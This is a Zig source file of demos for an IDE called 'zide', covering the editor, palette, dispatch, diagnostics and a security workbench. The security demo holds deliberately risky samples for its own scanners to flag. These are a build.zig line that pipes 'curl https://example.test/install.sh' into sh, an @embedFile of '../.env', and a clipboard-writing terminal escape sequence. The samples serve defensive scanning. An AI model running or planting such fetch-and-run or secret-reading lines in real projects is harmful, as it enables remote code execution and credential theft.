const std = @import("std");
const architecture = @import("../architecture.zig");
const app_mod = @import("app.zig");
const build_commands = @import("../build/commands.zig");
const build_output = @import("../build/output.zig");
const cli = @import("../cli.zig");
const command = @import("command.zig");
const dispatcher = @import("dispatcher.zig");
const event = @import("event.zig");
const event_loop = @import("event_loop.zig");
const input_handler = @import("input_handler.zig");
const loop_runner = @import("loop_runner.zig");
const buffer = @import("../editor/buffer.zig");
const document_store = @import("../editor/store.zig");
const modes = @import("../language/modes.zig");
const literal = @import("../search/literal.zig");
const build_consent = @import("../security/build_consent.zig");
const build_firewall = @import("../security/build_firewall.zig");
const security_findings = @import("../security/findings.zig");
const package_trust = @import("../security/package_trust.zig");
const posture = @import("../security/posture.zig");
const sanitizer = @import("../security/output_sanitizer.zig");
const zig_security = @import("../security/zig_scanner.zig");
const terminal_renderer = @import("../terminal/renderer.zig");
const tokenizer = @import("../language/zig_tokenizer.zig");
const palette_mod = @import("../ui/command_palette.zig");
const render = @import("../ui/render.zig");
const tui = @import("../ui/tui.zig");

pub fn run(allocator: std.mem.Allocator, kind: cli.DemoName, stdout: anytype) !void {
    switch (kind) {
        .overview => try overview(stdout),
        .architecture => try architectureDemo(stdout),
        .languages => try languages(stdout),
        .commands => try render.renderCommands(stdout),
        .editor => try editorDemo(allocator, stdout),
        .palette => try paletteDemo(allocator, stdout),
        .dispatch => try dispatchDemo(allocator, stdout),
        .diagnostics => try diagnosticsDemo(allocator, stdout),
        .input => try inputDemo(allocator, stdout),
        .loop => try loopDemo(allocator, stdout),
        .screen => try screenDemo(allocator, stdout),
        .security => try securityDemo(allocator, stdout),
        .buffer => try bufferDemo(allocator, stdout),
        .zig_tokens => try zigTokens(stdout),
    }
}

fn overview(stdout: anytype) !void {
    try stdout.writeAll(
        \\zide demo
        \\---------
        \\This is the first runnable slice of the IDE:
        \\  editor model       : byte-preserving text buffer
        \\  workspace model    : local directory scan
        \\  command model      : transparent command registry
        \\  language layer     : Zig tokenizer plus generic file modes
        \\  demo runner        : internal demos without external libraries
        \\
        \\Try:
        \\  zide demo architecture
        \\  zide demo languages
        \\  zide demo commands
        \\  zide demo editor
        \\  zide demo palette
        \\  zide demo dispatch
        \\  zide demo diagnostics
        \\  zide demo input
        \\  zide demo loop
        \\  zide demo screen
        \\  zide demo security
        \\  zide demo buffer
        \\  zide demo zig-tokens
        \\
    );
}

fn architectureDemo(stdout: anytype) !void {
    try stdout.writeAll("architecture layers\n-------------------\n");
    for (architecture.layers()) |layer| {
        try stdout.print("{s:<14} {s}\n", .{ architecture.layerName(layer.id), layer.owns });
        if (layer.may_call.len > 0) {
            try stdout.writeAll("  may call: ");
            for (layer.may_call, 0..) |callee, index| {
                if (index > 0) try stdout.writeAll(", ");
                try stdout.writeAll(architecture.layerName(callee));
            }
            try stdout.writeAll("\n");
        }
    }
}

fn securityDemo(allocator: std.mem.Allocator, stdout: anytype) !void {
    const source =
        \\const c = @cImport({});
        \\extern fn c_read(buf: [*]u8, len: usize) c_int;
        \\
        \\pub fn main() void {
        \\    const allocator = std.heap.c_allocator;
        \\    const token = @embedFile("../.env");
        \\    @setRuntimeSafety(false);
        \\    const p = @ptrCast(raw);
        \\    const x = parse() catch unreachable;
        \\    _ = allocator;
        \\    _ = token;
        \\    _ = p;
        \\    _ = x;
        \\}
        \\
    ;
    const build_source =
        \\const std = @import("std");
        \\pub fn build(b: *std.Build) void {
        \\    _ = b.addSystemCommand(&.{ "sh", "-c", "curl https://example.test/install.sh | sh" });
        \\    const generated = b.addWriteFiles();
        \\    _ = generated;
        \\    _ = b.dependency("netlib", .{});
        \\}
        \\
    ;
    const zon_source =
        \\.{
        \\  .name = .demo,
        \\  .dependencies = .{
        \\    .netlib = .{
        \\      .url = "https://example.test/netlib.tar.gz",
        \\    },
        \\    .local = .{
        \\      .path = "../vendor/local",
        \\    },
        \\  },
        \\}
        \\
    ;

    var collection = try zig_security.scanSource(allocator, source, .{ .path = "demo.zig" });
    defer collection.deinit();
    var build_findings = try build_firewall.scanBuildZig(allocator, build_source, .{});
    defer build_findings.deinit();
    try appendFindings(&collection, &build_findings);
    var package_findings = try package_trust.scanZon(allocator, zon_source, .{});
    defer package_findings.deinit();
    try appendFindings(&collection, &package_findings);

    var sanitized = try sanitizer.sanitizeAlloc(allocator, "build ok\x1b[2J hidden? \x1b]52;c;AAAA\x07done\n");
    defer sanitized.deinit(allocator);
    var consent = try build_consent.makePreview(
        allocator,
        build_commands.makeZigCommand(.{}, .test_step, &.{}),
        .untrusted,
    );
    defer consent.deinit();

    try stdout.writeAll("security workbench demo\n-----------------------\n");
    try stdout.writeAll("workspace: UNTRUSTED | build: BLOCKED | output: SANITIZED\n\n");
    try stdout.print("build consent command: {s}\n", .{consent.command});
    try stdout.print("build consent cwd    : {s}\n", .{consent.cwd});
    try stdout.print("trust state          : {s}\n", .{@tagName(consent.trust_state)});
    for (consent.warnings) |warning| {
        try stdout.print("warning              : {s}\n", .{warning});
    }
    try stdout.writeAll("\n");
    try stdout.print("findings: {d} total, {d} high+\n", .{
        collection.items.items.len,
        collection.countRiskAtLeast(.high),
    });
    const summary = posture.summarize(&collection, .untrusted);
    try stdout.print("posture: {s}, recommended trust: {s}\n", .{
        summary.label,
        @tagName(summary.recommended_trust),
    });
    try stdout.print("boundaries: build={d}, package={d}, ffi={d}, secret={d}, allocator={d}\n", .{
        summary.build_firewall,
        summary.package_trust,
        summary.ffi_boundary,
        summary.secret_flow,
        summary.allocator_policy,
    });
    try stdout.print("output sanitizer: stripped {d} control sequence(s)\n\n", .{sanitized.stats.total()});

    for (collection.items.items) |item| {
        try stdout.print("{s:<14} {s:<15} {s}:{d}:{d} {s}\n", .{
            @tagName(item.risk),
            @tagName(item.category),
            item.path,
            item.line + 1,
            item.column + 1,
            item.message,
        });
        try stdout.print("  {s}\n", .{item.evidence});
    }
}

fn appendFindings(target: *security_findings.Collection, source: *const security_findings.Collection) !void {
    for (source.items.items) |item| {
        try target.appendFinding(item);
    }
}

fn loopDemo(allocator: std.mem.Allocator, stdout: anytype) !void {
    var app = try app_mod.App.init(allocator, ".");
    defer app.deinit();
    var loop = event_loop.EventLoop.init(allocator);
    defer loop.deinit();

    try loop_runner.pushInputBytes(&loop, &.{0x10});
    const result = try loop_runner.drain(&app, &loop);

    try stdout.writeAll("event loop demo\n---------------\n");
    try stdout.print("handled : {d}\n", .{result.handled});
    try stdout.print("redraw  : {}\n", .{result.redraw_requested});
    try stdout.print("palette : {s}\n", .{if (app.palette.visible) "open" else "closed"});
}

fn screenDemo(allocator: std.mem.Allocator, stdout: anytype) !void {
    var app = try app_mod.App.init(allocator, ".");
    defer app.deinit();
    _ = try app.documents.createScratch("screen-demo.zig",
        \\const std = @import("std");
        \\
        \\extern fn c_read(buf: [*]u8, len: usize) c_int;
        \\
        \\pub fn main() void {
        \\    const token = @embedFile("../.env");
        \\    @setRuntimeSafety(false);
        \\    std.debug.print("screen\n", .{});
        \\}
        \\
    );
    _ = try dispatcher.dispatch(&app, .{ .id = "security.scan_current" });
    _ = try dispatcher.dispatch(&app, .{ .id = "zig.build" });
    try app.palette.open();
    try app.palette.setQuery("security");

    var screen = try tui.renderApp(allocator, &app, 80, 22);
    defer screen.deinit();

    try terminal_renderer.renderPlain(stdout, &screen);
}

fn inputDemo(allocator: std.mem.Allocator, stdout: anytype) !void {
    var app = try app_mod.App.init(allocator, ".");
    defer app.deinit();
    _ = try app.documents.createScratch("input-demo.zig", "");

    _ = try input_handler.handle(&app, charEvent('i'));
    _ = try input_handler.handle(&app, charEvent('z'));
    _ = try input_handler.handle(&app, charEvent('i'));
    _ = try input_handler.handle(&app, charEvent('d'));
    _ = try input_handler.handle(&app, charEvent('e'));
    _ = try input_handler.handle(&app, .{ .key = .{ .code = .escape } });

    const doc = app.documents.active() orelse return error.NoActiveDocument;
    try stdout.writeAll("input demo\n----------\n");
    try stdout.print("mode   : {s}\n", .{@tagName(app.mode)});
    try stdout.print("cursor : {d}\n", .{doc.cursor.position.byte_offset});
    try stdout.print("text   : {s}\n", .{doc.text.bytes});
}

fn charEvent(char: u21) event.Event {
    return .{ .key = .{ .code = .{ .char = char } } };
}

fn diagnosticsDemo(allocator: std.mem.Allocator, stdout: anytype) !void {
    var app = try app_mod.App.init(allocator, ".");
    defer app.deinit();

    try build_output.appendOutput(
        &app.process_console,
        &app.diagnostics,
        .stderr,
        "src/main.zig:12:9: error: expected expression\nsrc/root.zig:3:1: warning: unused variable\n",
    );

    try stdout.writeAll("diagnostics demo\n----------------\n");
    try stdout.print("console lines : {d}\n", .{app.process_console.lines.items.len});
    try stdout.print("errors        : {d}\n", .{app.diagnostics.countBySeverity(.error)});
    try stdout.print("warnings      : {d}\n\n", .{app.diagnostics.countBySeverity(.warning)});

    for (app.diagnostics.items.items) |item| {
        try stdout.print("{s}:{d}:{d}: {s}: {s}\n", .{
            item.path,
            item.range.start.line + 1,
            item.range.start.column + 1,
            @tagName(item.severity),
            item.message,
        });
    }
}

fn paletteDemo(allocator: std.mem.Allocator, stdout: anytype) !void {
    var palette = palette_mod.CommandPalette.init(allocator);
    defer palette.deinit();

    try palette.open();
    try palette.setQuery("zig");

    try stdout.writeAll("command palette demo\n--------------------\n");
    try stdout.print("query   : {s}\n", .{palette.query.items});
    try stdout.print("matches : {d}\n\n", .{palette.matches.items.len});

    const limit = @min(palette.matches.items.len, 8);
    for (palette.matches.items[0..limit]) |match| {
        try stdout.print("{d:>3}  {s:<24} {s}\n", .{ match.score, match.definition.id, match.definition.title });
    }
}

fn dispatchDemo(allocator: std.mem.Allocator, stdout: anytype) !void {
    var app = try app_mod.App.init(allocator, ".");
    defer app.deinit();

    const result = try dispatcher.dispatch(&app, .{ .id = "view.command_palette" });

    try stdout.writeAll("dispatch demo\n-------------\n");
    try stdout.print("result  : {s}\n", .{@tagName(std.meta.activeTag(result))});
    try stdout.print("mode    : {s}\n", .{@tagName(app.mode)});
    try stdout.print("palette : {s}\n", .{if (app.palette.visible) "open" else "closed"});
}

fn editorDemo(allocator: std.mem.Allocator, stdout: anytype) !void {
    var store = document_store.DocumentStore.init(allocator);
    defer store.deinit();

    _ = try store.createScratch("demo.zig",
        \\const std = @import("std");
        \\
        \\pub fn main() void {
        \\    std.debug.print("demo\n", .{});
        \\}
        \\
    );

    const doc = store.active() orelse return error.NoActiveDocument;
    try doc.insert(0, "//! zide editor demo\n");
    _ = try doc.undo();
    _ = try doc.redo();

    const matches = try literal.findAll(allocator, doc.text.bytes, "std", .{});
    defer allocator.free(matches);

    try stdout.writeAll("editor demo\n-----------\n");
    try stdout.print("path      : {s}\n", .{doc.path orelse "(scratch)"});
    try stdout.print("dirty     : {}\n", .{doc.dirty});
    try stdout.print("lines     : {d}\n", .{doc.text.lineCount()});
    try stdout.print("matches   : {d} occurrence(s) of 'std'\n\n", .{matches.len});

    var line: usize = 0;
    while (line < doc.text.lineCount()) : (line += 1) {
        try stdout.print("{d:>3} | {s}\n", .{ line + 1, doc.text.lineSlice(line) });
    }
}

fn languages(stdout: anytype) !void {
    try stdout.writeAll("language modes\n--------------\n");
    for (modes.all()) |mode| {
        const zig_note = if (modes.isZigFamily(mode)) "  Zig IDE features" else "  text support";
        try stdout.print("{s:<12}{s}\n", .{ modes.label(mode), zig_note });
    }
}

fn bufferDemo(allocator: std.mem.Allocator, stdout: anytype) !void {
    var text = try buffer.TextBuffer.initFromBytes(allocator,
        \\const std = @import("std");
        \\
        \\pub fn main() void {
        \\    std.debug.print("hello zide\n", .{});
        \\}
        \\
    );
    defer text.deinit();

    try text.insertBytes(0, "// demo buffer\n");
    try stdout.print("valid utf8: {}\n", .{text.valid_utf8});
    try stdout.print("newline   : {s}\n", .{@tagName(text.newline)});
    try stdout.print("lines     : {d}\n\n", .{text.lineCount()});

    var line: usize = 0;
    while (line < text.lineCount()) : (line += 1) {
        try stdout.print("{d:>3} | {s}\n", .{ line + 1, text.lineSlice(line) });
    }
}

fn zigTokens(stdout: anytype) !void {
    const source =
        \\const std = @import("std");
        \\pub fn add(a: i32, b: i32) i32 {
        \\    return a + b;
        \\}
        \\
    ;

    var lexer = tokenizer.Tokenizer.init(source);
    try stdout.writeAll("zig tokens\n----------\n");
    while (true) {
        const token = lexer.next();
        if (token.tag == .eof) break;
        try stdout.print("{s:<18} {s}\n", .{ @tagName(token.tag), source[token.start..token.end] });
    }
}

test "all commands are visible to demos" {
    try std.testing.expect(command.all().len > 0);
}
